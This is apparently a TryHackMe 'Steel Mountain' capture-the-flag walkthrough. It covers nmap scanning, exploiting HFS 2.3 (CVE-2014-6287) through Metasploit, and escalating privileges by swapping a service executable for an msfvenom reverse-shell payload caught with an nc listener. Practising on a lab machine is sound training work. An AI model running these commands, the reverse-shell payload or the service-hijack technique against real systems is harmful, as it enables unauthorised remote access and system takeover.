Steel Mountain is a THM machine 

![image](https://github.com/user-attachments/assets/c9a4dba0-4117-4d65-9e7f-3f8dd916f518)

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

nmap -sC -sV 10.10.224.110 -oA initial  

* -sC: run default nmap scripts
* -sV: detect service version
* -O: detect OS [not allowed to run on this machine- I got an error]
* -oA: output all formats and store in file initial

We get back the following result showing that below ports are open:

* Port 80: running Microsoft IIS httpd 8.5 HTTP method risky :Trace
* Port 135: msrpc
* Port 139: netbios-ssn
* Port 445:  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
* Port 3389: ssl/ms-wbt-server?
* Port 8080 : open  http               HttpFileServer httpd 2.3 http-server-header: HFS 2.3





![image](https://github.com/user-attachments/assets/66f63413-c1bd-4ba1-9f8d-703c42515757)

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

nmap -sC -sV -O -p- -oA full $IP


We get back the following result. No other ports are open.



Similarly, we run an nmap scan with the -sU flag enabled to run a UDP scan.

nmap -sU -O -p- -oA udp $IP


**Enumeration**
I always start off with enumerating HTTP first. In this case both 80 and 8080 are open so we’ll start there.

Ports 80 & 8080

Visit the site on the browser.

![image](https://github.com/user-attachments/assets/12aec968-4a0e-4c18-8c4d-7302df33f566)


![image](https://github.com/user-attachments/assets/6de5a185-9e60-4c41-bc2a-eec9d4a12a2c)

View the source code to see if we can find any other information. We see that the photo on the port 80 is Employee of the month Bill Harper 

![image](https://github.com/user-attachments/assets/9b04f2a8-adab-4d60-bdee-0baaae09a824)

What is the CVE number to exploit this file server?

We know the name of the file version, and that it is running version 2.3. We can therefore use the searchsploit command (or look at exploitdb’s website). I entered the following command:

searchsploit HFS -w

This gave me the following results. Note I used the -w flag to get a link to exploit-db.

![image](https://github.com/user-attachments/assets/98505663-dd1b-4c86-a8b3-56c8941464a9)

Of you look carefully you can see that there are are at least two exploits for version 2.3.x. Let’s try the Remote Command Execution (1) at the following link:

https://www.exploit-db.com/exploits/34668?source=post_page-----90af67ec1af6--------------------------------

Use Metasploit to get an initial shell. What is the user flag?

Startup Metasploit by running msfconsole.

The great thing about Metasploit is that we can search on CVE number. Let’s do this by running:

search 2014–6287
![image](https://github.com/user-attachments/assets/13289ada-5d7e-4f73-a02d-614f25f0dd5b)

![image](https://github.com/user-attachments/assets/1fd2fdb3-c23a-4710-a8e3-a9b7360fdea3)

We can follow this by entering use 0. This select the module.

To see the different options we need to adjust we can run show options.

A lot of this is already set to defaults, so the only options we have to set are RHOSTS, which means the target host ip address, and RPORT. You can set it using set RHOSTS <ip>.

Now all we need to do is enter run or exploit.

We got access to a meterpreter shell:
![image](https://github.com/user-attachments/assets/ad190d50-b6cb-4ced-a24d-e751f2ef0f10)

![image](https://github.com/user-attachments/assets/69d78adf-85f1-4680-b4f2-f09b45d169cb)

Now we need to find the user flag.

We can use the following command to search for all txt files:

search -f *.txt

59 resulsts 
![image](https://github.com/user-attachments/assets/80efaab5-23a8-4251-ab09-b517dc7be423)

We are interested in this file 
![image](https://github.com/user-attachments/assets/15e66b61-c827-42da-bf2d-1b26118fb232)

Now all we need to do is read the file.

Remember too use forward slashes.

![image](https://github.com/user-attachments/assets/a1d99982-61a1-417e-816b-067d6b16d4fe)


**Privilege Escalation**

Now that you have an initial shell on this Windows machine as Bill (enter getuid in the meterpreter shell to see this), we can further enumerate the machine and escalate our privileges to root!

**Questions**
To enumerate this machine, we will use a PowerShell script called PowerUp, whose purpose is to evaluate a Windows machine and determine any abnormalities — “PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.” You can download the script here.

Now you can use the upload command in Metasploit to upload the script. To execute this using Meterpreter, I will type load powershell into Meterpreter. Then I will enter PowerShell by entering powershell_shell:

![image](https://github.com/user-attachments/assets/54f08ec1-58c4-4b47-9f21-e66635573c82)

After doing this you just have to run the PowerUp Powershell script by entering:

![image](https://github.com/user-attachments/assets/6b619afc-6d02-467b-89c3-c0fa9ee2e682)

This gives a long list of abnormalities:

![image](https://github.com/user-attachments/assets/4b9e40d4-2859-40b5-93f0-81f450b620ff)

The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, and restart the service, which will run our infected program!

Use msfvenom to generate a reverse shell as a Windows executable.

 *msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe%* 

msfvenom -p windows/shell_reverse_tcp LHOST=10.17.38.50 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe


![image](https://github.com/user-attachments/assets/58a0d79a-3d4a-4623-b24c-e43e591b1ddb)
Now we generated a reverse shell with the name ASCService.exe.

We can now leave the Powershell shell, and use the same upload command as before:
![image](https://github.com/user-attachments/assets/cee7565b-04f9-4657-9d46-d6a9387990f7)

No we need to replace the legitimate one. Enter a regular cmd shell from your meterpreter shell by entering: shell.

Before copying, we need to stop the service by entering:
*sc stop AdvancedSystemCareService9*
![image](https://github.com/user-attachments/assets/c375ee3b-aa40-45c9-b048-5f4fd51f0bb5)


![image](https://github.com/user-attachments/assets/203402e6-5081-467d-baca-58d37840ffae)

![image](https://github.com/user-attachments/assets/a91cefa8-cedc-441e-af35-2c7ea84e3d82)



Then copy the file to the original location:
Now we need to start a listener!

*nc -lvnp 4443*

Then restart the program to get a shell as root.
![image](https://github.com/user-attachments/assets/43b6e119-ca74-4105-ba94-6d813157b494)


![image](https://github.com/user-attachments/assets/9ac96fe6-bec3-422d-9612-7ccefedb3931)

And we have system access!

